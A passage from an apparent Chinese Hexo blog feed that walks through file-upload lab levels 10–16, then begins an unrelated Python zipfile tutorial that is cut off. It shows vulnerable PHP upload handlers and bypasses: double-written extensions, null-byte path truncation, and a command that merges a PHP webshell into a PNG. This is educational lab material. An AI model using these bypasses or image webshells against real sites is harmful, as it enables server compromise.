class="keyword">null</span>;<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>审计：</strong><br>str_ireplace() 函数替换字符串中的一些字符（不区分大小写）。<br><code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code>这段代码的意思就是，讲文件名字替换为空。所以我们可以双写过滤。<br><strong>上传绕过：</strong><br><img src="/images/100.png" alt="21306b16500a3f576a4a07e6d2af0341.png"></p><h4 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a><strong>第十一关</strong></h4><hr><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;$msg = <span class="keyword">null</span>;<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>审计：</strong><br>1.<br><code>$file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);</code><br>截取文件后缀，具体的函数百度吧。<br>既然是截取文件后缀然后在看后缀是否在对应数组中，随意我们可以试一下00截断。我至今才明白00截断漏洞的原理是截断目录。而目录截断会有多种方式比如这个题的方式就是get得到目录的路径。<br><strong>上传绕过：</strong></p><h4 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a><strong>第十二关</strong></h4><hr><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;$msg = <span class="keyword">null</span>;<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>审计：</strong><br>这里第十一关的区别为是post型接受路径。<br><strong>上传绕过：</strong><br>要注意加号的hex为2b。<br><img src="/images/101.png" alt="12e330524f14d2310e6a48bb7e2d566f.png"></p><h4 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a><strong>第十三关</strong></h4><hr><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;$msg = <span class="keyword">null</span>;<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>审计：</strong><br>1.fopen() 函数<br>fopen() 函数打开文件或者 URL。<br>2.fread()函数<br>fread() 函数读取文件（可安全用于二进制文件）。<br>3.unpack()函数<br>unpack() 函数从二进制字符串对数据进行解包。<br>4.图片马制作<br>copy 1.png/b+shell.php webshell.png<br><strong>上传绕过：</strong><br>在这里我们上传之后，执行的的时候只能看到图片并不能执行里面的代码，要配合文件上传漏洞。</p><h4 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a><strong>第十四关</strong></h4><hr><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$is_upload = <span class="keyword">false</span>;$msg = <span class="keyword">null</span>;<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>审计：</strong><br>1.<br>getimagesize()函数用于获取图像大小及相关信息，成功返回一个数组.。<br>getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及<strong>文件类型</strong>及图片高度与宽度。<br>2.image_type_to_extension — 根据指定的图像类型返回对应的后缀名。<br><strong>上传绕过:</strong><br>与第十六关一样。</p><h4 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a><strong>第十五关</strong></h4><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;$msg = <span class="keyword">null</span>;<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>审计：</strong><br>1.exif_imagetype()<br>exif_imagetype() — 判断一个图像的类型说明<br>int exif_imagetype ( string $filename )<br>exif_imagetype() 读取一个图像的第一个字节并检查其签名。<br><strong>代码审计：</strong><br>上传图片码</p><h4 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a><strong>第十六关</strong></h4><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;$msg = <span class="keyword">null</span>;<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    $filename = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.<span class="string">'/'</span>.basename($filename);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    $fileext= substr(strrchr($filename,<span class="string">"."</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">"jpg"</span>) &amp;&amp; ($filetype==<span class="string">"image/jpeg"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是jpg格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".jpg"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"png"</span>) &amp;&amp; ($filetype==<span class="string">"image/png"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是png格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".png"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagepng($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"gif"</span>) &amp;&amp; ($filetype==<span class="string">"image/gif"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是gif格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".gif"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传后缀为.jpg|.png|.gif的图片文件！"</span>;</span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>审计：</strong><br>1.<br>basename() 函数返回路径中的文件名部分。<br>2.<br>strrchr() 函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。<br>3.<br>imagecreatefromjpeg() 返回一图像标识符，代表了从给定的文件名取得的图像。<br>成功时返回图像资源标识符，错误时返回false。 </p><ol start="4"><li>imagejpeg-将图像输出到浏览器或文件 。<br>bool imagejpeg ( resource image [, string filename [, int quality]] )<br><img src="/images/102.png" alt="c9fc38e13c23d2e32008b18c507d7542.png"><br>上文的im就是imagecreatefromjepeg()返回的结果。</li><li>unlink() 函数删除文件。@就是不报错。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;文件上传漏洞解析&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞原理" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
      <category term="文件上传" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>python之zipfile模块-1</title>
    <link href="http://yoursite.com/2019/08/14/python%E4%B9%8Bzipfile%E6%A8%A1%E5%9D%97-1/"/>
    <id>http://yoursite.com/2019/08/14/python之zipfile模块-1/</id>
    <published>2019-08-14T09:32:14.000Z</published>
    <updated>2019-08-17T09:17:10.306Z</updated>
    
    <content type="html"><![CDATA[<p>python之zipfile模块</p><a id="more"></a><h4 id="python中zipfile模块实例化解析"><a href="#python中zipfile模块实例化解析" class="headerlink" title="python中zipfile模块实例化解析"></a><strong>python中zipfile模块实例化解析</strong></h4><p><strong>简介：</strong><br>zipfile是python里用来做zip格式编码的压缩和解压缩的，由于是很常见的zip格式，所以这个模块使用频率也是比较高的。<br>　　Python zipfile模块用来做zip格式编码的压缩和解压缩的，要进行相关操作。<br>      首先需要实例化一个 ZipFile 对象。<br>      ZipFile 接受一个字符串格式压缩包名称作为它的必选参数，第二个参数为可选参数，表示打开模式，类似于文件操作，有r/w/a三种模式，分别代表读、写、添加，默认为r，即读模式。<br>　　zipfile里有两个非常重要的class, 分别是ZipFile和ZipInfo, 在绝大多数的情况下，我们只需要使用这两个class就可以了。ZipFile是主要的类，用来创建和读取zip文件而ZipInfo是存储的zip文件的每个文件的信息的。<br><strong>一、<br>下面我们就来介绍这两个类的基本操作：</strong></p><hr><p>1.比如要读取一个Python zipfile 模块，这里假设filename是一个文件的路径:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line">z =zipfile.ZipFile(filename, <span class="string">'r'</span>)</span><br><span class="line"><span class="comment">#这里的第二个参数用r表示是读取zip文件，w是创建一个zip文件</span></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> z.namelist():</span><br><span class="line"><span class="keyword">print</span> f</span><br></pre></td></tr></table></figure><p>上面的代码是读取一个zip压缩包里所有文件的名字。z.namelist() 会返回压缩包内所有文件名的列表。<br><strong>例子1：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile      <span class="comment">#引入zipfile类</span></span><br><span class="line">z= zipfile.ZipFile(<span class="string">'C:/Users/12521/Desktop/123.zip'</span>,<span class="string">'r'</span>)<span class="comment">#以只读的形式文件</span></span><br><span class="line">f=open(<span class="string">'C:/Users/12521/Desktop/3.txt'</span>,<span class="string">'w'</span>)<span class="comment">#写入文件</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> z.namelist(): <span class="comment">#namelist是一个方法，用来列出文件中压缩包名字的方法。</span></span><br><span class="line">f.write(i + <span class="string">'\n'</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p><img src="/images/93.png" alt="57ebeb94e29c803492ded528dfe309fd.png"><br>2.读取文件的详细内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line">z = zipfile.ZipFile(filename, <span class="string">'r'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span 